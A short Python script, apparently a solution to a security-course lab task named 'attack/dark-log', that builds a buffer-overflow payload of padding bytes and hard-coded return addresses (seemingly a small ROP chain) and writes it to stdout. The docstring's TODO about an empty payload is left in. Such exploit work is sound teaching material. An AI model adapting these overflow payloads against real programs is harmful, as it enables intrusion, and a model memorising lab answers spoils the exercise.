#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = (
    b" " * 8
    + b"\xa4\x18\x40\x00\x00\x00\x00\x00"
    + b"\xa3\x18\x40\x00\x00\x00\x00\x00"
    + b"\x04\x00\x00\x00\x00\x00\x00\x00"
    + b"\x77\x16\x40\x00\x00\x00\x00\x00"
    + b" " * 88
    + b" " * 128
    + b"\xa0\x00\x00\x00"
    + b" " * 20
)

sys.stdout.buffer.write(payload)
